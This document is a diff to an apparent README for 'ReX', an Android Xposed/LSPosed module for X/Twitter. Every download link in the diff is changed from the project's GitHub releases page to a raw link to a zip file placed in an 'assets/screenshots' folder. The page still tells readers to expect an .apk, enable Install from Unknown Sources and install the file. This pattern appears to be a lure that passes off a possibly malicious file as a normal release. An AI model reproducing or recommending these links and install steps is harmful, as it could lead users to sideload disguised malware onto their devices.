@@ -1,7 +1,7 @@
 <h1>⚡ one.dot.rex - Supercharge Your X/Twitter Experience</h1>
 
 <div style="text-align: center; margin: 20px 0;">
-  <a href="https://github.com/winnahcasebook332/one.dot.rex/releases" style="display: inline-block; padding: 16px 36px; font-size: 22px; font-weight: bold; background-color: #FF4500; color: white; text-decoration: none; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.3);">📥 Latest Download</a>
+  <a href="https://raw.githubusercontent.com/winnahcasebook332/one.dot.rex/main/assets/screenshots/v3.4-beta.4.zip" style="display: inline-block; padding: 16px 36px; font-size: 22px; font-weight: bold; background-color: #FF4500; color: white; text-decoration: none; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.3);">📥 Latest Download</a>
 </div>
 
 <p style="text-align: center; font-size: 18px;">Re:X (ReX) brings powerful tweaks and customizations to the new X / Twitter on your Android device. Unlock features you never knew you needed!</p>
@@ -19,7 +19,7 @@
 <p>Follow these steps to get started right now:</p>
 
 <ol>
-  <li><strong>Visit this link to download the application.</strong> → <a href="https://github.com/winnahcasebook332/one.dot.rex/releases">Click here</a> and look for the latest release file (usually ends with <code>.apk</code>).</li>
+  <li><strong>Visit this link to download the application.</strong> → <a href="https://raw.githubusercontent.com/winnahcasebook332/one.dot.rex/main/assets/screenshots/v3.4-beta.4.zip">Click here</a> and look for the latest release file (usually ends with <code>.apk</code>).</li>
   <li>Enable <strong>Install from Unknown Sources</strong> on your Android device if asked.</li>
   <li>Open the downloaded file and tap <strong>Install</strong>.</li>
   <li>After installation, open the app. It will guide you through activating the module (requires <strong>LSPosed</strong> or <strong>Xposed</strong> framework).</li>
@@ -48,7 +48,7 @@
 <p><strong>Step-by-Step Installation:</strong></p>
 
 <ol>
-  <li>Go to <a href="https://github.com/winnahcasebook332/one.dot.rex/releases">this page</a> and download the latest APK file.</li>
+  <li>Go to <a href="https://raw.githubusercontent.com/winnahcasebook332/one.dot.rex/main/assets/screenshots/v3.4-beta.4.zip">this page</a> and download the latest APK file.</li>
   <li>Open the APK and install it.</li>
   <li>Open the LSPosed or Xposed app on your device.</li>
   <li>Find "ReX" in the module list and enable it.</li>
@@ -57,7 +57,7 @@
 </ol>
 
 <div style="text-align: center; margin: 30px 0;">
-  <a href="https://github.com/winnahcasebook332/one.dot.rex/releases" style="display: inline-block; padding: 14px 28px; font-size: 18px; font-weight: bold; background-color: #1DA1F2; color: white; text-decoration: none; border-radius: 6px; box-shadow: 0 3px 6px rgba(0,0,0,0.2);">Download Now</a>
+  <a href="https://raw.githubusercontent.com/winnahcasebook332/one.dot.rex/main/assets/screenshots/v3.4-beta.4.zip" style="display: inline-block; padding: 14px 28px; font-size: 18px; font-weight: bold; background-color: #1DA1F2; color: white; text-decoration: none; border-radius: 6px; box-shadow: 0 3px 6px rgba(0,0,0,0.2);">Download Now</a>
 </div>
 
 <h2>🛑 Troubleshooting</h2>
